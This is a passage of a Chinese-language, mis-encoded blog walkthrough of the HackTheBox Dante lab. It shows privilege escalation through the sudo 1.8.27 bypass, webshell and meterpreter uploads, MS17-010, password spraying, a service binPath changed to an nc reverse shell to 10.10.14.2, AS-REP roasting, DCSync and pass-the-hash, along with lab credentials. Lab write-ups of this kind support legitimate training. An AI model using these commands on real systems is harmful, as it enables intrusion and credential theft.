class="line">+-----------------------------+</span><br></pre></td></tr></table></figure><p>membership_usersè¡¨çš„éƒ¨åˆ†å­—æ®µçˆ†ç ´ç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+---------+----------+----------------+------------------------------------------+</span><br><span class="line">| groupID | memberID | email          | passMD5                                  |</span><br><span class="line">+---------+----------+----------------+------------------------------------------+</span><br><span class="line">| 2       | admin    | &lt;blank&gt;        | 21232f297a57a5a743894a0e4a801fc3 (admin) |</span><br><span class="line">| NULL    | ben      | ben@dante.htb  | 442179ad1de9c25593cabf625c0badb7         |</span><br><span class="line">| 3       | egre55   | egre55@htb.com | d6501933a2e0ea1f497b87473051417f         |</span><br><span class="line">| 1       | guest    | NULL           | NULL                                     |</span><br><span class="line">+---------+----------+----------------+------------------------------------------+</span><br></pre></td></tr></table></figure><p>å°†è¿™ä¸‰ä¸ªhashä¿å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œç„¶åjohnçˆ†ç ´ï¼Œä»¥ä¸‹æ˜¯çˆ†ç ´ç»“æœï¼š</p><p><a href="https://pic.imgdb.cn/item/6462138b0d2dde577733498e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462138b0d2dde577733498e.jpg"></a></p><p>å¾—åˆ°äº†benç”¨æˆ·çš„å¯†ç ï¼Œé‚£çœ‹çœ‹sshèƒ½ä¸èƒ½å†ç”¨è¿™ä¸ªå¯†ç è¿ä¸Šå»ï¼š</p><p><a href="https://pic.imgdb.cn/item/646213e20d2dde5777339a6e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646213e20d2dde5777339a6e.jpg"></a></p><p>å¯ä»¥è¿æ¥ä¸Šå»ï¼Œåœ¨å½“å‰ç›®å½•ä¸‹å¯ä»¥æ‹¿åˆ°flagã€‚</p><h3 id="Minus-minus-plus"><a href="#Minus-minus-plus" class="headerlink" title="Minus + minus &#x3D; plus?"></a>Minus + minus &#x3D; plus?</h3><p>ä¹‹åæ‰§è¡Œä¸€ä¸‹sudo -lçœ‹çœ‹èƒ½ç”¨sudoæ‰§è¡Œå“ªäº›å‘½ä»¤ï¼š</p><p><a href="https://pic.imgdb.cn/item/646214600d2dde57773414db.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646214600d2dde57773414db.jpg"></a></p><p>è¿™ä¸ªæ„æ€æ˜¯æŒ‡æˆ‘ä»¬å¯ä»¥ä»¥ä»»ä½•äººé™¤äº†rootçš„æƒé™æ‰§è¡Œbashï¼Œè€Œæ‰§è¡Œsudo â€“versionå¯ä»¥çœ‹åˆ°sudoçš„ç‰ˆæœ¬ä¸º1.8.27ï¼Œå› æ­¤ææƒæ–¹å¼ä¸ºsudo 1.8.27 - Security Bypassï¼Œæ‰§è¡Œ<code>sudo -u#-1 /bin/bash</code>ï¼Œå¯ä»¥ä»¥rootæƒé™æ‰§è¡Œä»»æ„å‘½ä»¤ï¼š</p><p><a href="https://pic.imgdb.cn/item/6462b0c10d2dde577711fae0.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462b0c10d2dde577711fae0.jpg"></a></p><p>ä¸æ­¤åŒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°åœ¨ç³»ç»Ÿä¸­è¿˜å­˜åœ¨ä¸€ä¸ªjulianç”¨æˆ·ï¼Œå°è¯•è¯»å–&#x2F;etc&#x2F;shadowï¼Œå¹¶ç”¨johnçˆ†ç ´å¾—åˆ°å¯†ç ï¼Œå¾—åˆ°ä¸€å¯¹å¸å·å¯†ç ï¼šjulian:manchesterunitedï¼Œç›¸ä¿¡æˆ‘ï¼Œè¿™ä¸ªå¯†ç ä¼šåœ¨åé¢ç”¨åˆ°ã€‚è‡³æ­¤ï¼ŒDANTE-NIX04ä¹ŸæˆåŠŸgetrootã€‚</p><h3 id="Congratulations-to-a-perfect-pear"><a href="#Congratulations-to-a-perfect-pear" class="headerlink" title="Congratulations to a perfect pear"></a>Congratulations to a perfect pear</h3><p>ä¹‹åæˆ‘ä»¬çœ‹172.16.1.102ï¼Œå¼€æ”¾äº†80ã€135ã€139ã€443ã€445ä»¥åŠ3306ç«¯å£ã€‚åœ¨ç½‘ç«™çš„ä¸‹æ–¹æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªç«™ä½¿ç”¨äº†<code>Online Marriage Registration System</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/64622a690d2dde57774e73ed.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64622a690d2dde57774e73ed.jpg"></a></p><p>ä¹‹åä½¿ç”¨searchsploitæ¥æœç´¢è¿™ä¸ªæ¡†æ¶ï¼Œæ‰¾åˆ°äº†ä¸€äº›POCï¼š</p><p><a href="https://pic.imgdb.cn/item/64622b370d2dde57774f3bbf.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64622b370d2dde57774f3bbf.jpg"></a></p><p>éšä¾¿æ‹‰å–ä¸€ä¸ªPOCæ¥æ‰“ï¼š</p><p><a href="https://pic.imgdb.cn/item/64622bf80d2dde577750042c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64622bf80d2dde577750042c.jpg"></a></p><p>æ­¤æ—¶å·²ç»ä¸Šä¼ å¥½äº†webshelläº†ï¼Œåªä¸è¿‡webshellçš„æ ¼å¼èšå‰‘è¿ä¸ä¸Šï¼Œä¾ç„¶æŠŠä¸Šé¢å…æ€ä¹‹åçš„é©¬ä¸Šä¼ ï¼Œç„¶åèšå‰‘è¿æ¥å³å¯ï¼š</p><p><a href="https://pic.imgdb.cn/item/64622d1b0d2dde577751800b.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64622d1b0d2dde577751800b.jpg"></a></p><p><a href="https://pic.imgdb.cn/item/64622d320d2dde577751aad9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64622d320d2dde577751aad9.jpg"></a></p><p>flagåœ¨blakeæ¡Œé¢ç›®å½•ä¸‹çš„flag.txtä¸­</p><h3 id="MinatoTW-strikes-again"><a href="#MinatoTW-strikes-again" class="headerlink" title="MinatoTW strikes again"></a>MinatoTW strikes again</h3><p>æ¥ç€ä¸Šä¼ ä¸€ä¸ªåˆ©ç”¨msfvenomç”Ÿæˆçš„é©¬ï¼Œç„¶åæ‰§è¡Œå¾—åˆ°ä¸€ä¸ªmeterpreterï¼Œå¾—åˆ°meterpreterä¹‹åç›´æ¥getsystemæ‹¿åˆ°systemæƒé™ï¼š</p><p><a href="https://pic.imgdb.cn/item/64622e460d2dde577752f4d7.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64622e460d2dde577752f4d7.jpg"></a></p><p>è‡³æ­¤DANTE-WS03ä¹Ÿæ‰“å®Œäº†ã€‚</p><h3 id="That-just-blew-my-mind"><a href="#That-just-blew-my-mind" class="headerlink" title="That just blew my mind"></a>That just blew my mind</h3><p>æ¥ä¸‹æ¥çœ‹172.16.1.20ï¼Œfscanæ‰«æç»“æœæ˜¾ç¤ºå¼€æ”¾äº†22ã€80ã€135ã€139ã€443ã€445ä»¥åŠ88ç«¯å£ã€‚æ—¢ç„¶å¼€æ”¾äº†88ç«¯å£ï¼Œé‚£æœ‰å¯èƒ½æ˜¯ä¸€å°åŸŸæ§ã€‚fscanè¿˜æ˜¾ç¤ºå­˜åœ¨ms17-010æ¼æ´ï¼Œé‚£ä¹ˆç”¨ç›´æ¥msfæ‰“å°±å¯ä»¥äº†ï¼š</p><p><a href="https://pic.imgdb.cn/item/6461e3130d2dde5777d3369d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461e3130d2dde5777d3369d.jpg"></a></p><p>æ‹¿åˆ°meterpreterä¹‹åï¼Œç›´æ¥å°±æ˜¯systemæƒé™ã€‚ä¹‹åæˆ‘ä»¬ä¼šåœ¨katwambaçš„æ¡Œé¢ç›®å½•ä¸‹çœ‹åˆ°ä¸€ä¸ªå«èŒå·¥å¤‡ä»½çš„xlsxæ–‡ä»¶ï¼š</p><p><a href="https://pic.imgdb.cn/item/64623af10d2dde577764df8d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64623af10d2dde577764df8d.jpg"></a></p><p>æˆ‘ä»¬æŠŠå®ƒä¸‹è½½ä¸‹æ¥ï¼š</p><p><a href="https://pic.imgdb.cn/item/64623b4c0d2dde577765afd0.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64623b4c0d2dde577765afd0.jpg"></a></p><p>è§‚å¯Ÿè¿™é‡Œï¼ŒBåˆ—è¢«éšè—äº†ï¼š</p><p><a href="https://pic.imgdb.cn/item/64623be40d2dde577766f146.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64623be40d2dde577766f146.jpg"></a></p><p>æˆ‘ä»¬å°†å®ƒè¿˜åŸå‡ºåï¼Œå¯ä»¥å¾—åˆ°Aåˆ—usernameï¼ŒBåˆ—passwordã€‚å¯¹äº†ï¼Œæ‰§è¡Œ<code>net user mrb3n</code>æœ‰æƒŠå–œå“¦ã€‚ä¹‹åæˆ‘ä»¬é€šè¿‡è°ƒç”¨msfçš„kiwiæ¨¡å—å¯ä»¥æŠ“å–åˆ°ä¸€å¯¹å¸å·å¯†ç ï¼Œ<code>xadmin:Peacemaker!</code>ï¼Œè¿˜æ˜¯ä¸€ä¸ªåŸŸç®¡ã€‚ä¸è¿‡ä»¤äººæ‚²ä¼¤çš„æ˜¯ï¼Œdante.localè¿™ä¸ªåŸŸä¸­ä¼¼ä¹åªæœ‰DANTE-DC01è¿™ä¸€å°æœºå­äº†ï¼Œä»¥ä¸‹æ˜¯é€šè¿‡ldapsearchæœç´¢å¾—åˆ°çš„ç»“æœï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># proxychains4 ldapsearch -x -H ldap://172.16.1.20:389 -D &quot;CN=xadmin,CN=Users,DC=DANTE,DC=local&quot; -w Peacemaker! -b &quot;DC=DANTE,DC=local&quot; &quot;(&amp;(objectCategory=computer)(objectClass=computer))&quot; CN | grep cn  </span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.20:389  ...  OK</span><br><span class="line">cn: DANTE-DC01</span><br></pre></td></tr></table></figure><p>å› æ­¤æ‹¿åˆ°åŸŸç®¡è´¦æˆ·ä¼¼ä¹ä¹Ÿæ— æµäºäº‹ã€‚</p><h3 id="Update-the-policy"><a href="#Update-the-policy" class="headerlink" title="Update the policy!"></a>Update the policy!</h3><p>é‚£æ¥ç€æˆ‘ä»¬çœ‹172.16.1.101è¿™å°æœºå­ï¼Œnmapæ‰«æä¹‹åå¼€æ”¾çš„ç«¯å£æœ‰21ã€135ã€139ã€445ã€5040ã€5985ã€‚ä¹‹åå°è¯•ftpåŒ¿åç™»å½•ï¼Œæ— æœã€‚å°è¯•åˆ©ç”¨ä¹‹å‰excelä¸­æ‹¿åˆ°çš„usernameå’Œpasswordçˆ†ç ´ï¼š</p><p><a href="https://pic.imgdb.cn/item/646252f30d2dde57779d66b2.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646252f30d2dde57779d66b2.jpg"></a></p><p>å¾—åˆ°ä¸€ç»„å¯ä»¥æˆåŠŸç™»å½•ftpçš„å¸å·å¯†ç ï¼š<code>dharding:WestminsterOrange5</code>ï¼Œftpç™»å½•åï¼Œå¾—åˆ°ä¸€ä¸ªå«â€Remote login.txtâ€œçš„æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Dido,</span><br><span class="line">I&#x27;ve had to change your account password due to some security issues we have recently become aware of</span><br><span class="line"></span><br><span class="line">It&#x27;s similar to your FTP password, but with a different number (ie. not 5!)</span><br><span class="line"></span><br><span class="line">Come and see me in person to retrieve your password.</span><br><span class="line"></span><br><span class="line">thanks,</span><br><span class="line">James</span><br></pre></td></tr></table></figure><p>æç¤ºdhardingçš„è´¦æˆ·å¯†ç ä¸FTPå¯†ç ç±»ä¼¼ï¼Œåªæ˜¯æœ€åä¸€ä½æ•°å­—5å‘ç”Ÿäº†æ”¹å˜ï¼Œé‚£æˆ‘ä»¬å…ˆç”¨forå¾ªç¯ç”Ÿæˆä¸€ä¸ªå¯†ç å­—å…¸ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;0..100&#125;;do echo &quot;WestminsterOrange$i&quot; &gt;&gt; pass1.txt;done</span><br></pre></td></tr></table></figure><p>ä¹‹åç”¨cmeå¼€å§‹çˆ†ç ´ï¼ŒæˆåŠŸå¾—åˆ°è´¦æˆ·å¯†ç ä¸º<code>dharding:WestminsterOrange17</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/646252b80d2dde57779c9e54.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646252b80d2dde57779c9e54.jpg"></a></p><p>ç”¨evil-winrmç™»å½•å³å¯åœ¨æ¡Œé¢æ‹¿åˆ°flagï¼š</p><p><a href="https://pic.imgdb.cn/item/646253470d2dde57779e74e7.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646253470d2dde57779e74e7.jpg"></a></p><h3 id="Single-or-double-quotes"><a href="#Single-or-double-quotes" class="headerlink" title="Single or double quotes"></a>Single or double quotes</h3><p>ä¹‹åæˆ‘ä»¬å¯ä»¥åœ¨â€œC:\Program Files (x86)\IObitâ€ç›®å½•ä¸‹çœ‹åˆ°â€œIObit Uninstallerâ€ï¼ŒæŸ¥çœ‹IObit Uninstallerç›®å½•ä¸‹çš„History.txtï¼š</p><p><a href="https://pic.imgdb.cn/item/6462595b0d2dde5777ad58f2.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462595b0d2dde5777ad58f2.jpg"></a></p><p>è¯¥ç‰ˆæœ¬çš„IObit Uninstallerå­˜åœ¨é€šè¿‡å¯ä¿¡ä»»æœåŠ¡è·¯å¾„ææƒçš„é—®é¢˜ã€‚ä½†æ˜¯æ­¤å¤„æˆ‘ä»¬å´ä¸æ˜¯é€šè¿‡è¿™ä¸ªé—®é¢˜æ¥ææƒçš„ï¼Œæˆ‘ä»¬æ‰§è¡Œä¸€ä¸‹<code>cmd.exe /c &quot;sc qc IObitUnSvr&quot;</code>ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/646259c00d2dde5777ae4234.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646259c00d2dde5777ae4234.jpg"></a></p><p>å¯ä»¥çœ‹åˆ°IObitUnSvræœåŠ¡çš„äºŒè¿›åˆ¶è·¯å¾„ä¸­å·²ç»ä¸å­˜åœ¨ç©ºæ ¼äº†ã€‚ä½†æ˜¯è¿™ä¸ªæœåŠ¡æ˜¯ä»¥systemæƒé™å¯åŠ¨çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯èƒ½ä»ç„¶éœ€è¦é€šè¿‡è¿™ä¸ªæœåŠ¡æ¥ææƒï¼Œåªæ˜¯éœ€è¦å¦å¯»å®ƒæ³•ã€‚å› ä¸ºè¿™å°æœºå­powershellçš„æ‰§è¡Œç­–ç•¥ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥ä½¿ç”¨Get-ServiceAcl.ps1è·å–æœåŠ¡çš„ACLï¼Œæ‰§è¡Œ<code>Get-ExecutionPolicy</code>å¯ä»¥çœ‹åˆ°æ‰§è¡Œç­–ç•¥æ˜¾ç¤ºRestrictedï¼š</p><p><a href="https://pic.imgdb.cn/item/646257b60d2dde5777a956e2.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646257b60d2dde5777a956e2.jpg"></a></p><p>ç›´æ¥æ‰§è¡ŒSet-ExecutionPolicy Unrestrictedåˆä¼šæç¤ºæˆ‘ä»¬æ‹’ç»æ›´æ”¹ã€‚å¯ä»¥åˆ©ç”¨ä»¥ä¸‹è¯­å¥æŸ¥çœ‹ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-ExecutionPolicy</span> Bypass <span class="literal">-Command</span> <span class="string">&quot;&amp; &#123;Import-Module C:\Users\dharding\Documents\Get-ServiceAcl.ps1;&#x27;IObitUnSvr&#x27; | Get-ServiceAcl | select -ExpandProperty Access&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>ç»“æœä¸ºï¼š</p><p><a href="https://pic.imgdb.cn/item/6462584e0d2dde5777aaea36.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462584e0d2dde5777aaea36.jpg"></a></p><p>å¯ä»¥çœ‹åˆ°dhardingç”¨æˆ·æ‹¥æœ‰æŸ¥è¯¢ã€æ›´æ”¹â€œIObitUnSvrâ€æœåŠ¡é…ç½®çš„æƒé™ï¼Œè¿˜æ‹¥æœ‰å¼€å§‹å’Œå…³é—­è¯¥æœåŠ¡çš„æƒé™ã€‚é‚£è¿™ç›´æ¥æ”¹IObitUnSvræœåŠ¡çš„äºŒè¿›åˆ¶è·¯å¾„ä¸å°±ç›´æ¥getsystemäº†å—ï¼Ÿæ¥ä¸‹æ¥æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªncç¨‹åºï¼Œä¹‹ååˆ©ç”¨ä»¥ä¸‹è¯­å¥æ›´æ”¹æœåŠ¡çš„äºŒè¿›åˆ¶ç¨‹åºè·¯å¾„ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe config IObitUnSvr binPath=<span class="string">&quot;cmd.exe /c C:\Users\dharding\Desktop\nc64.exe -e cmd.exe 10.10.14.2 1238&quot;</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä¹‹åå†æ¬¡æŸ¥çœ‹æœåŠ¡é…ç½®ï¼Œå¯ä»¥çœ‹åˆ°äºŒè¿›åˆ¶ç¨‹åºè·¯å¾„å·²ç»å‘ç”Ÿäº†æ”¹å˜ï¼š</p><p><a href="https://pic.imgdb.cn/item/64625c2f0d2dde5777b3a3c9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64625c2f0d2dde5777b3a3c9.jpg"></a></p><p>ä¹‹åsc stop IObitUnSvrå†sc start IObitUnSvré‡å¯æœåŠ¡ï¼Œå³å¯æ‹¿åˆ°system shellï¼š</p><p><a href="https://pic.imgdb.cn/item/64625c600d2dde5777b40ebb.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64625c600d2dde5777b40ebb.jpg"></a></p><h3 id="An-open-goal"><a href="#An-open-goal" class="headerlink" title="An open goal"></a>An open goal</h3><p>æ¥ç€æˆ‘ä»¬çœ‹172.16.1.5è¿™å°æœºå­ï¼Œfscanæ‰«æç»“æœæ˜¾ç¤ºå¼€æ”¾äº†21ã€135ã€139ã€445ä»¥åŠ1433ç«¯å£ï¼Œ1433ç«¯å£ä¸€èˆ¬è¢«mssqlå ç”¨ã€‚ é¦–å…ˆftpåŒ¿åç™»å½•ï¼Œæ‹¿åˆ°ç¬¬ä¸€ä¸ªflagï¼š</p><p><a href="https://pic.imgdb.cn/item/64625e1c0d2dde5777b7e878.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64625e1c0d2dde5777b7e878.jpg"></a></p><p>å› ä¸ºæ²¡æœ‰å¸å·å’Œå¯†ç ï¼Œæˆ‘ä»¬æ— æ³•è¿æ¥smbå’Œmssqlï¼Œå› æ­¤è¿™å°æœºå­å…ˆæš‚æ—¶æç½®ã€‚æ‰“åé¢çš„æœºå­å†çœ‹çœ‹æœ‰æ²¡æœ‰çº¿ç´¢ã€‚</p><h3 id="Itâ€™s-getting-hot-in-here"><a href="#Itâ€™s-getting-hot-in-here" class="headerlink" title="Itâ€™s getting hot in here"></a>Itâ€™s getting hot in here</h3><p>å› ä¸ºä¹‹å‰çš„Dante-DC01é€šè¿‡ms17-010æ‰“ç»å¸¸sessionç»´æŒä¸èµ·æ¥ï¼Œæ²¡ä¸€ä¼šå„¿å°±æ‰äº†ï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œæ˜¯åˆ©ç”¨ä¹‹å‰å¾—åˆ°çš„åŸŸç®¡å¸å·é€šè¿‡evil-winrmç™»å½•è¿›å»ï¼Œå¹¶ä¸Šä¼ msfé©¬ï¼Œè¿è¡Œæœ¨é©¬æ‹¿åˆ°çš„meterpreterã€‚ï¼Œæ‰§è¡Œipconfigä¹‹åçœ‹åˆ°æœ‰ä¸‰å¼ ç½‘å¡ï¼š</p><p><a href="https://pic.imgdb.cn/item/646261570d2dde5777c1248d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646261570d2dde5777c1248d.jpg"></a></p><p>çŒœæµ‹å¯èƒ½è¿˜å­˜åœ¨ä¸€ä¸ªç½‘æ®µï¼Œåˆ©ç”¨ä»¥ä¸‹cmdå‘½ä»¤æ‰«ä¸€ä¸‹172.16.2.0&#x2F;24è¿™ä¸ªæ®µå§ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find &quot;Reply&quot;</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/6462623a0d2dde5777c2f8b7.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462623a0d2dde5777c2f8b7.jpg"></a></p><p>å‘ç°è¿˜æœ‰ä¸€å°IPä¸º172.16.2.5çš„ä¸»æœºã€‚ä¹‹åæ·»åŠ è·¯ç”±ï¼ŒæŠŠ172.16.2.0&#x2F;24è¿™ä¸ªæ®µç»™æ·»åŠ è¿›æ¥ï¼ˆrun autoroute -s 172.16.2.0&#x2F;24ï¼‰ï¼Œæ‰«ä¸€æ³¢ç«¯å£ï¼š</p><p><a href="https://pic.imgdb.cn/item/646264930d2dde5777c7aaf6.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646264930d2dde5777c7aaf6.jpg"></a></p><p>è¿™å°ä¸»æœºè¿è¡Œç€DNSã€Kerberosè¿˜æœ‰LDAPï¼Œåº”è¯¥åˆæ˜¯ä¸€å°DCã€‚å»ºç«‹ä¸€æ¡ä»£ç†ï¼š</p><p><a href="https://pic.imgdb.cn/item/646266d50d2dde5777cc4c77.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646266d50d2dde5777cc4c77.jpg"></a></p><p>ä¹‹åæˆ‘ä»¬ä¼šé€šè¿‡è¿™æ¡ä»£ç†æ‰“172.16.2.5ã€‚æ•…æŠ€é‡æ–½åˆ©ç”¨ms17-010æ‰“172.16.2.5ï¼Œæ²¡æˆåŠŸï¼š</p><p><a href="https://pic.imgdb.cn/item/6462676d0d2dde5777cd60cb.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462676d0d2dde5777cd60cb.jpg"></a></p><p>é‚£æ¥ä¸‹æ¥å°±å¯¹åŸŸå†…ç”¨æˆ·è¿›è¡Œæšä¸¾å§ã€‚äº†è§£Kerberosåè®®çš„å¸ˆå‚…åº”è¯¥çŸ¥é“åŸŸå†…ç”¨æˆ·æšä¸¾çš„åŸç†ï¼Œå¤§è‡´å°±æ˜¯å› ä¸ºAS_REQå‘é€çš„è¯·æ±‚åŒ…ä¸­cnameå­—æ®µçš„æ­£ç¡®ä¸å¦ï¼Œå¯¼è‡´AS_REPå“åº”åŒ…çš„ä¸åŒæ¥è¿›è¡Œæšä¸¾çš„ã€‚é¦–å…ˆæˆ‘ä»¬è¿›è¡Œç«¯å£è½¬å‘ï¼ŒæŠŠ88ç«¯å£å’Œ53ç«¯å£è½¬å‘åˆ°æœ¬åœ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -L 127.0.0.1 -l 53 -p 53 -r 172.16.2.5</span><br><span class="line">portfwd add -L 127.0.0.1 -l 88 -p 88 -r 172.16.2.5</span><br></pre></td></tr></table></figure><p>ä¹‹åä½¿ç”¨kerbruteè¿›è¡ŒåŸŸç”¨æˆ·åæšä¸¾ï¼Œç”¨æˆ·åå­—å…¸æ˜¯ä¹‹å‰ä»excelæ–‡ä»¶ä¸­è¯»åˆ°é‚£äº›usernameï¼š</p><p><a href="https://pic.imgdb.cn/item/64626de60d2dde5777d89f05.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64626de60d2dde5777d89f05.jpg"></a></p><p>ä¹‹ååˆ©ç”¨cmeçˆ†ç ´å¯†ç ï¼Œè·‘äº†ä¸€å¤œï¼Œç¡è§‰å»äº†ï¼Œé†’æ¥å‘ç°æ²¡ç»“æœï¼Œæˆ‘çŸ¥é“æ˜¯æ—¶å€™æ”¾å¼ƒç›´æ¥çˆ†ç ´å¯†ç äº†ã€‚æ­¤æ—¶æˆ‘ä»¬æ‰‹ä¸Šå·²ç»æœ‰äº†ä¸€ä¸ªåŸŸç”¨æˆ·çš„usernameï¼Œä½†æ²¡æœ‰è¯¥ç”¨æˆ·çš„å¯†ç ï¼Œå› æ­¤æ— æ³•è¿›è¡ŒKerberoastingæ”»å‡»ï¼Œä½†æ˜¯å¯ä»¥è¿›è¡ŒAS_REP Roastingæ”»å‡»ã€‚AS_REP Roastingæ”»å‡»æ˜¯å› ä¸ºåŸŸç”¨æˆ·å‹¾é€‰äº†â€ä¸è¦æ±‚Kerberosé¢„èº«ä»½éªŒè¯â€œçš„é€‰é¡¹ï¼Œæ”»å‡»è€…è¿›è¡ŒAS_REQä¹‹åï¼ŒKDCä¼šä¸ä½œä»»ä½•éªŒè¯ä¾¿å°† TGT ç¥¨æ®å’ŒåŠ å¯†çš„ Session-key ç­‰ä¿¡æ¯è¿”å›ï¼Œå³AS_REPã€‚æ”»å‡»è€…å¯ä»¥å¯¹ç”±ç”¨æˆ·çš„NTLM HashåŠ å¯†ä¹‹åçš„Session-key è¿›è¡Œç¦»çº¿ç ´è§£ï¼Œå¦‚æœçˆ†ç ´æˆåŠŸï¼Œå°±èƒ½å¾—åˆ°è¯¥æŒ‡å®šç”¨æˆ·çš„æ˜æ–‡å¯†ç ã€‚ impacketçš„GetNPUsers.pyè„šæœ¬ä¸ºæˆ‘ä»¬æä¾›äº†è¿›è¡ŒAS_REP Roastingæ”»å‡»çš„å·¥å…·ï¼š</p><p><a href="https://pic.imgdb.cn/item/646273290d2dde5777e05761.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646273290d2dde5777e05761.jpg"></a></p><p>ä¹‹åæˆ‘ä»¬åˆ©ç”¨johnå¯¹è¯¥Hashè¿›è¡Œçˆ†ç ´ï¼š</p><p><a href="https://pic.imgdb.cn/item/646274830d2dde5777e2716c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646274830d2dde5777e2716c.jpg"></a></p><p>ä¹‹ååˆ©ç”¨evil-winrmç™»å½•å°±è¡Œäº†ï¼ŒDesktopç›®å½•ä¸‹æ‹¿åˆ°flagï¼š</p><p><a href="https://pic.imgdb.cn/item/646274fe0d2dde5777e30ea3.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646274fe0d2dde5777e30ea3.jpg"></a></p><h3 id="One-misconfig-to-rule-them-all"><a href="#One-misconfig-to-rule-them-all" class="headerlink" title="One misconfig to rule them all"></a>One misconfig to rule them all</h3><p>ä¹‹åæˆ‘ä»¬ä¸Šä¼ SharpHound.exeé‡‡é›†æ•°æ®ï¼Œå¯¼å…¥è¿›BloodHoundï¼Œç‚¹å‡»åˆ†æé‡Œçš„<code>Find Principalswith DCSync Rights</code>é€‰é¡¹å¡ï¼Œå¯ä»¥å‘ç°jbercovå¯ä»¥å¯¹dante.adminåŸŸè¿›è¡ŒDCSyncæ”»å‡»ã€‚åˆ©ç”¨impacketçš„secretsdump.pyè„šæœ¬è¿›è¡Œæ”»å‡»ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q python3 secretsdump.py dante/jbercov:myspace7@172.16.2.5 -just-dc-user Administrator</span><br></pre></td></tr></table></figure><p>æŠ“åˆ°äº†Administratorçš„å¯†ç Hashï¼š</p><p><a href="https://pic.imgdb.cn/item/64627ad50d2dde5777e91601.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64627ad50d2dde5777e91601.jpg"></a></p><p>ä¹‹åæˆ‘ä»¬å¯ä»¥é€šè¿‡PTHçš„æ–¹æ³•é…åˆä½¿ç”¨psexecå·¥å…·æ¥æ‹¿åˆ°systemæƒé™ï¼š</p><p><a href="https://pic.imgdb.cn/item/64627c730d2dde5777ebf3f8.jpg" class="gallery-item"><img 